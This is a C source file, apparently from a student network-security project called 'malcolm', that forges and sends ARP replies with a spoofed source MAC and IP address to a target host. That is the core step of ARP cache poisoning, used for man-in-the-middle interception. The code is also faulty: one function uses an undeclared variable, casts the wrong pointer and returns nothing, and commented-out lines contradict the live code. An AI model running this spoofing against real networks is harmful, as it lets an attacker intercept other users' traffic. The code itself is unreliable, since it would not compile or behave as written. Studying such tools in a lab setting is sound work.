#include "malcolm.h"

static void	display_addr(t_arp *arp)
{
	char		*mac;
	char		*ip;

	printf("Sending an ARP reply to the target address with spoofed source\n");
	mac = mac_strconv(arp->sender_mac);
	ip = ip_strconv(arp->sender_ip);
	printf("\tsource mac address : %s\n"
			"\tsource IP address : %s\n", mac, ip);
	ft_multifree(&mac, &ip, NULL);
	mac = mac_strconv(arp->target_mac);
	ip = ip_strconv(arp->target_ip);
	printf("\ttarget mac address : %s\n"
			"\ttarget IP address : %s\n", mac, ip);
	ft_multifree(&mac, &ip, NULL);
}

static t_arp	*fill_arp(t_malcolm *mal, t_arp *arp, t_arp *bef)
{
	uint64_t	empty;

	empty = 0;
	ft_memcpy(arp->d_mac, bef->sender_mac, MAC_LEN);
	set_mac_addr(mal->s_maddr, arp->s_mac, MAC_LEN);
	arp->etype = htons(ETHERTYPE_ARP);
	arp->htype = htons(1);
	arp->ptype = htons(ETHERTYPE_IP);
	arp->hlen = MAC_LEN;
	arp->plen = IP_LEN;
	arp->opcode = htons(ARPOP_REPLY);
	set_mac_addr(mal->s_maddr, arp->sender_mac, MAC_LEN);
	//ft_memcpy(arp->sender_ip, bef->target_ip, IP_LEN);
	set_ip_addr(mal->s_ip, arp->sender_ip, IP_LEN);
	//ft_memcpy(arp->target_mac, (uint8_t *)&empty, MAC_LEN);
	set_mac_addr(mal->d_maddr, arp->target_mac, MAC_LEN);
	//ft_memcpy(arp->target_ip, bef->sender_ip, IP_LEN);
	set_ip_addr(mal->d_ip, arp->target_ip, IP_LEN);
	ft_bzero(arp->padding, PADDING_LEN);
	return (arp);
}

static struct sockaddr	*fill_sockaddr(t_malcolm *mal, struct sockaddr *sockad)
{
	struct sockaddr_in *sockadin;

	sockadin = (struct sockaddr_in *)&sockad;
	ft_memcpy(&sockadin->sin_addr.s_addr, arp->target_ip, IP_LEN);
	ft_strcpy(sockad->sa_data, mal->ifa->ifa_name);
	sockadin->sin_family = AF_INET;
}

void	send_arp(t_malcolm *mal, char *recvbuf)
{
	ssize_t			ret;
	struct sockaddr sockad;
	t_arp			*arp;
	t_arp			*bef;
	char			buf[BUFSIZE];

	bef = (t_arp *)(recvbuf);
	arp = (t_arp *)buf;
	fill_arp(mal, arp, bef);
	fill_sockaddr(mal, &sockad);
	display_addr(arp);
	ret = sendto(mal->sockfd, buf, sizeof(t_arp), 0, &sockad, sizeof(sockad));
	printf("Sent an ARP reply packet (%ld bytes)\n", ret);
}
